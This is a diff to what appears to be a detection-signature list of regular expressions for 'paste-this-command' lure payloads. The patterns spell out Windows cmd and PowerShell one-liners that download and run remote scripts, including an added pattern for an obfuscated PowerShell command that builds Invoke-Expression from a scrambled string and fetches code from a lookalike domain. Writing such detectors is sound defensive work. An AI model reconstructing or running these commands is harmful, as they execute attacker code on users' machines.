@@ -72,5 +72,6 @@
   "(?s)cmd\\s+/c\\s+set\\s+\"spain=ftp\"&set\\s+\"italy=report-ftp\\.wiki\"&set\\s+\"greek=\\|\\s+\"&set\\s+\"polan=for\\s+/f\\s+%m\\s+in\\s+\\('dir\\s+/b\\s+/s\\s+%windir%\\\\System32\\\\cm\\?\\.e\\?\\?'\\)\\s+do\\s+%m\"&start\\s+\"\"\\s+/min\\s+cmd\\s+/c\\s+\"%spain%\\s+%italy%\\s+%greek%%polan%\"",
   "(?s)powershell\\s+-nop\\s+-c\\s+\"\\$f=\\$env:TEMP\\+'\\\\pintk\\.ps1';curl\\.exe\\s+-sk\\s+-o\\s+\\$f\\s+'(?:https?://)?[^\\s\"'<>|;`()]+';powershell\\s+-ep\\s+bypass\\s+-File\\s+\\$f\"",
   "(?s)powershell\\s+-w\\s+h\\s+\"iex\\(irm\\s+\\\\'fingerprint-veri\\.info/d8fc26fb3c8ae49a\\\\'\\);\\s+Start-Sleep\\s+-Seconds\\s+30\";\\s+exit",
-  "(?s)\\.\\.\\.'\\s+\"'\\s+\\+\\s+escapeCmdExeQuotedArg\\(APPS_SCRIPT_URL\\)\\s+\\+\\s+'\"';\\s+//\\s+Wrap\\s+in\\s+cmd\\.exe\\s+/c\\s+\"\\.\\.\\.\"\\s+with\\s+CMD-style\\s+doubled\\s+quotes\\s+so\\s+paste\\s+works\\s+//\\s+in\\s+both\\s+CMD\\s+and\\s+PowerShell\\.\\.\\."
+  "(?s)\\.\\.\\.'\\s+\"'\\s+\\+\\s+escapeCmdExeQuotedArg\\(APPS_SCRIPT_URL\\)\\s+\\+\\s+'\"';\\s+//\\s+Wrap\\s+in\\s+cmd\\.exe\\s+/c\\s+\"\\.\\.\\.\"\\s+with\\s+CMD-style\\s+doubled\\s+quotes\\s+so\\s+paste\\s+works\\s+//\\s+in\\s+both\\s+CMD\\s+and\\s+PowerShell\\.\\.\\.",
+  "(?s)powershell\\s+\"\\$o='i8-nkpIEex5Yv1sor';&\\(\\$\\(\\$u='';\\$OFS=\\$u;\"\\$\\(\\$o\\[6,3,12,15,4,8,2,7,9,5,16,8,14,14,0,15,3\\]\\)\"\\)\\)\\s+\\$\\(&\\('Invoke-'\\+'RestMethod'\\)\\s+cloudfiare\\.io/u\\)\""
 ]
